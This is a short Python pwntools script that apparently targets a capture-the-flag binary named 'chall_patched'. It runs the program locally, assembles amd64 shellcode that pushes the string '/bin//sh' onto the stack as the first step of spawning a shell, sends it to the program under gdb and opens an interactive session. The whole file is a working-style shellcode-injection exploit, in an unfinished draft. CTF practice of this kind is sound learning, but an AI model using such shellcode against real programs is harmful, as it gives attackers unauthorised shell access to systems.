from pwn import *

context.arch = "amd64"

r = process("./chall_patched")

asem = """
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
"""
gdb.attach(r)
pause()

r.sendline(asm(asem))



r.interactive()